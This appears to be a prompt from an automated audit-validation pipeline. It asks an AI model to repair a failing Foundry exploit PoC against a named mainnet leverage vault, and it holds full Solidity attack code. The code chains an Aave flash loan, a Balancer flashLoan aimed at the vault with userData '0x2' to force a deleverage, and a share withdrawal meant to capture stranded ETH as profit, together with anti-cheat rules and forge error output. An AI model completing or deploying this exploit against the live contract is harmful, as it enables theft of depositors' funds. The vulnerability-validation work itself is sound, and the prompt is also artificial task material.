You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Anyone can invoke the Balancer callback and force arbitrary leveraging or deleveraging
- claim: `receiveFlashLoan()` only checks `msg.sender == balancer` and the raw `userData` bytes, but never verifies that this vault initiated the flash loan or that a flash-loan operation is currently expected. Because Balancer flash loans are permissionless, any external account can ask Balancer to call this vault with `userData = "0x1"` or `"0x2"` and force `_deposit()` or `_withdraw()` against the vault's live position.
- impact: A permissionless attacker can repeatedly rebalance the vault without consent, paying flash-loan fees out of shared equity, forcing unexpected leverage changes, stranding large amounts of ETH on the contract while the vault remains unpaused, or even re-levering paused funds back into Aave. This breaks the vault's trust model and can drive material fund loss, insolvency, or set up the direct theft paths described below.
- exploit_paths: ["Attacker calls Balancer `flashLoan(recipient = vault, token = WETH, amount = chosenAmount, userData = \"0x1\")` to force `_deposit()`", "Or attacker calls Balancer `flashLoan(recipient = vault, token = WETH, amount <= getDebt(), userData = \"0x2\")` to force `_withdraw()`", "Balancer invokes `receiveFlashLoan()` on the vault", "Vault executes the requested rebalance even though no vault function initiated it"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IEFLeverVault {
    function ef_token() external view returns (address);
    function balancer() external view returns (address);
    function weth() external view returns (address);
    function mlr() external view returns (uint256);
    function getFeeParam() external view returns (uint256);
    function getVolume() external view returns (uint256);
    function getDebt() external view returns (uint256);
    function is_paused() external view returns (bool);
    function deposit(uint256 amount) external payable;
    function withdraw(uint256 amount) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

interface IAaveV2Like {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xe39fd820B58f83205Db1D9225f28105971c3D309;
    address public constant AAVE_V2 = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 internal _profitAmount;
    bool public attempted;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (attempted) {
            return;
        }
        attempted = true;

        uint256 startingWealth = _totalWealthInEthTerms();
        IEFLeverVault vault = IEFLeverVault(TARGET);
        if (vault.is_paused()) {
            _finalizeProfit(startingWealth);
            return;
        }

        IERC20Like efToken = IERC20Like(vault.ef_token());
        if (efToken.balanceOf(address(this)) == 0) {
            _obtainSeedShares(vault, efToken);
        }

        if (efToken.balanceOf(address(this)) != 0) {
            _attemptExploit(vault, efToken);
        }

        _finalizeProfit(startingWealth);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == AAVE_V2, "only aave");
        require(initiator == address(this), "bad initiator");
        require(assets.length == 1 && amounts.length == 1 && premiums.length == 1, "bad arrays");
        require(assets[0] == WETH, "bad asset");

        uint256 seedEth = abi.decode(params, (uint256));
        require(seedEth == amounts[0], "bad seed");

        IEFLeverVault vault = IEFLeverVault(TARGET);
        IERC20Like efToken = IERC20Like(vault.ef_token());

        IWETHLike(WETH).withdraw(seedEth);
        vault.deposit{value: seedEth}(seedEth);

        _attemptExploit(vault, efToken);

        uint256 repayment = amounts[0] + premiums[0];
        uint256 wethBalance = IERC20Like(WETH).balanceOf(address(this));
        if (wethBalance < repayment) {
            uint256 shortfall = repayment - wethBalance;
            require(address(this).balance >= shortfall, "bootstrap unpaid");
            IWETHLike(WETH).deposit{value: shortfall}();
        }

        require(IERC20Like(WETH).approve(AAVE_V2, 0), "approve reset failed");
        require(IERC20Like(WETH).approve(AAVE_V2, repayment), "approve failed");
        return true;
    }

    function attemptForcedUnwind(uint256 forcedLoanAmount, uint256 shareAmount) external {
        require(msg.sender == address(this), "self only");

        IEFLeverVault vault = IEFLeverVault(TARGET);
        IERC20Like efToken = IERC20Like(vault.ef_token());

        uint256 debtBefore = vault.getDebt();
        uint256 totalSupply = efToken.totalSupply();
        require(debtBefore > 1, "no debt");
        require(totalSupply > 0, "no supply");
        require(shareAmount > 0 && shareAmount <= efToken.balanceOf(address(this)), "bad shares");
        require(forcedLoanAmount > 0 && forcedLoanAmount < debtBefore, "bad forced amount");

        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = vault.weth();
        amounts[0] = forcedLoanAmount;

        IBalancerVaultLike(vault.balancer()).flashLoan(TARGET, tokens, amounts, bytes("0x2"));

        uint256 residualDebt = vault.getDebt();
        require(residualDebt < debtBefore, "debt unchanged");
        require(address(TARGET).balance > 0, "no stranded eth");

        // The follow-up withdrawal must still request a strictly positive nested
        // Balancer flash loan. If the residual debt is too small for the shares
        // we hold, the vault's own withdraw path becomes mechanically infeasible
        // on this fork because it computes a zero loan amount.
        require((residualDebt * shareAmount) / totalSupply > 0, "zero nested loan");

        vault.withdraw(shareAmount);
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _obtainSeedShares(IEFLeverVault vault, IERC20Like efToken) internal {
        uint256 targetShares = _minimumSeedSharesForExploit(vault, efToken);
        if (targetShares == 0) {
            return;
        }

        uint256 directSeed = _findMinimumDepositForMint(vault, efToken, targetShares, address(this).balance);
        if (directSeed != 0) {
            try vault.deposit{value: directSeed}(directSeed) {
                return;
            } catch {}
        }

        uint256 bootstrapCap = _seedSearchCap(vault, efToken, targetShares);
        uint256 bootstrapSeed = _findMinimumDepositForMint(vault, efToken, targetShares, bootstrapCap);
        if (bootstrapSeed == 0) {
            return;
        }

        address[] memory assets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        uint256[] memory modes = new uint256[](1);
        assets[0] = WETH;
        amounts[0] = bootstrapSeed;
        modes[0] = 0;

        try IAaveV2Like(AAVE_V2).flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            abi.encode(bootstrapSeed),
            0
        ) {} catch {}
    }

    function _attemptExploit(IEFLeverVault vault, IERC20Like efToken) internal returns (bool) {
        uint256 shareBalance = efToken.balanceOf(address(this));
        uint256 debtBefore = vault.getDebt();
        uint256 totalSupply = efToken.totalSupply();

        if (shareBalance == 0 || debtBefore <= 1 || totalSupply == 0) {
            return false;
        }

        uint256 residualDebtMin = _ceilDiv(totalSupply, shareBalance);
        if (residualDebtMin >= debtBefore) {
            return false;
        }

        uint256 forcedLoanAmount = debtBefore - residualDebtMin;
        try this.attemptForcedUnwind(forcedLoanAmount, shareBalance) {
            return true;
        } catch {}

        for (uint256 offset = 1; offset <= 8; offset++) {
            uint256 residualDebt = residualDebtMin + offset;
            if (residualDebt >= debtBefore) {
                break;
            }

            try this.attemptForcedUnwind(debtBefore - residualDebt, shareBalance) {
                return true;
            } catch {}
        }

        uint16[12] memory residualBps = [uint16(1), 2, 5, 10, 20, 50, 100, 200, 500, 1000, 2000, 5000];
        for (uint256 i = 0; i < residualBps.length; i++) {
            uint256 residualDebt = (debtBefore * residualBps[i]) / 10000;
            if (residualDebt < residualDebtMin) {
                residualDebt = residualDebtMin;
            }
            if (residualDebt == 0 || residualDebt >= debtBefore) {
                continue;
            }

            try this.attemptForcedUnwind(debtBefore - residualDebt, shareBalance) {
                return true;
            } catch {}
        }

        return false;
    }

    function _finalizeProfit(uint256 startingWealth) internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            IWETHLike(WETH).deposit{value: ethBalance}();
        }

        uint256 endingWealth = IERC20Like(WETH).balanceOf(address(this));
        if (endingWealth > startingWealth) {
            _profitAmount = endingWealth - startingWealth;
        }
    }

    function _minimumSeedSharesForExploit(IEFLeverVault vault, IERC20Like efToken) internal view returns (uint256) {
        uint256 debt = vault.getDebt();
        uint256 totalSupply = efToken.totalSupply();
        if (debt <= 1 || totalSupply == 0) {
            return 0;
        }

        return _ceilDiv(totalSupply, debt - 1);
    }

    function _findMinimumDepositForMint(
        IEFLeverVault vault,
        IERC20Like efToken,
        uint256 targetShares,
        uint256 maxAvailableEth
    ) internal view returns (uint256) {
        if (targetShares == 0 || maxAvailableEth == 0) {
            return 0;
        }

        uint256 low = _minimumInitialDeposit(vault);
        if (low == 0) {
            low = 1;
        }
        if (low > maxAvailableEth) {
            return 0;
        }

        if (_previewMint(vault, efToken, low) >= targetShares) {
            return low;
        }

        uint256 high = low;
        while (high < maxAvailableEth) {
            if (high > maxAvailableEth / 2) {
                high = maxAvailableEth;
            } else {
                high *= 2;
            }

            if (_previewMint(vault, efToken, high) >= targetShares) {
                break;
            }
            if (high == maxAvailableEth) {
                return 0;
            }
        }

        uint256 left = low + 1;
        uint256 right = high;
        uint256 best = high;
        while (left <= right) {
            uint256 mid = left + ((right - left) / 2);
            if (_previewMint(vault, efToken, mid) >= targetShares) {
                best = mid;
                if (mid == 0) {
                    break;
                }
                right = mid - 1;
            } else {
                left = mid + 1;
            }
        }

        return best;
    }

    function _seedSearchCap(
        IEFLeverVault vault,
        IERC20Like efToken,
        uint256 targetShares
    ) internal view returns (uint256) {
        uint256 volumeBefore = vault.getVolume();
        uint256 totalSupply = efToken.totalSupply();

        if (volumeBefore < 1e9) {
            return 1 ether;
        }
        if (totalSupply == 0) {
            return 0;
        }

        uint256 approxNet = _ceilDiv(targetShares * volumeBefore, totalSupply);
        uint256 cap = approxNet * 4;
        if (cap < 1e16) {
            cap = 1e16;
        }
        if (cap < 1 ether) {
            cap = 1 ether;
        }

        uint256 hardCeiling = volumeBefore + 1 ether;
        if (cap > hardCeiling) {
            cap = hardCeiling;
        }
        return cap;
    }

    function _minimumInitialDeposit(IEFLeverVault vault) internal view returns (uint256) {
        if (vault.getVolume() < 1e9) {
            return 1e16;
        }
        return 1;
    }

    function _previewMint(
        IEFLeverVault vault,
        IERC20Like efToken,
        uint256 amount
    ) internal view returns (uint256 minted) {
        if (amount == 0) {
            return 0;
        }

        uint256 volumeBefore = vault.getVolume();
        uint256 feePara = vault.getFeeParam();
        uint256 mlrValue = vault.mlr();
        if (feePara <= mlrValue) {
            return 0;
        }

        uint256 loanAmount = (mlrValue * amount) / (feePara - mlrValue);
        uint256 feeAmount = (loanAmount * (feePara - 10000)) / 10000;
        if (amount <= feeAmount) {
            return 0;
        }

        uint256 netAmount = amount - feeAmount;
        uint256 totalSupply = efToken.totalSupply();

        if (volumeBefore < 1e9) {
            return netAmount;
        }
        if (totalSupply == 0 || volumeBefore == 0) {
            return 0;
        }

        minted = (netAmount * totalSupply) / volumeBefore;
    }

    function _totalWealthInEthTerms() internal view returns (uint256) {
        return address(this).balance + IERC20Like(WETH).balanceOf(address(this));
    }

    function _ceilDiv(uint256 x, uint256 y) internal pure returns (uint256) {
        if (x == 0) {
            return 0;
        }
        return ((x - 1) / y) + 1;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: flashloan(recipient = vault, token = weth, amount = chosenamount, userdata = "0x1"), _deposit(), flashloan(recipient = vault, token = weth, amount <= getdebt(), userdata = "0x2"), _withdraw(), receiveflashloan(); generated code does not cover paths indexes: 0, 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
